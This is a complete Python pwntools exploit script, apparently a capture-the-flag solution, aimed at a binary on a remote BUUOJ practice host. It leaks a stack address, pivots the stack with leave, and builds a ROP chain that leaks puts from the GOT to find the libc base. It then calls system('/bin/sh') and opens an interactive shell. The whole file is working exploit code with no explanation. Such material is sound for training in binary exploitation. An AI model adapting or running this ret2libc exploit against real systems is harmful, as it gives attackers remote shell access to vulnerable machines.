from pwn import *

context(arch='amd64', os='linux')
#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-v']
libc = ELF('./libc.so.6')
elf = ELF('./pwn')

LOCAL = False
if LOCAL:
    p = process('./pwn')
else:
    p = remote('node5.buuoj.cn', 28607)
#gdb.attach(p, 'b *0x4012BE')
rdi_addr =0x401333
ret_addr =0x40101A
main =0x4011FB
leave =0x4012AA
 
p.recvuntil(b'name:\n')
p.send(b'a'*8)
p.recvuntil(b'I have a small gift for you: ')
stack = int(p.recv(14),16) + 8
 
p.recvuntil(b'more infomation plz:\n')
 
payload = b'a'*8 + p64(rdi_addr) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)
payload = payload.ljust(80,b'a')
payload += p64(stack) +p64(leave)
p.send(payload)

p.recvuntil("maybe I'll see you soon!\n")
puts_addr =u64(p.recvuntil(b'\x7f')[:6].ljust(8, b'\x00'))
 
libc_base = puts_addr - libc.sym['puts']
sys_addr = libc_base + libc.sym['system']
bin_sh = libc_base +  next(libc.search(b"/bin/sh\x00"))
 
p.recvuntil(b'name:\n')
p.send(b'a'*8)
p.recvuntil(b'I have a small gift for you: ')
stack =int(p.recv(14),16) + 8
 
payload = b'a'*8 + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)
payload = payload.ljust(80,b'a')
payload += p64(stack) +p64(leave)
p.send(payload)
p.interactive()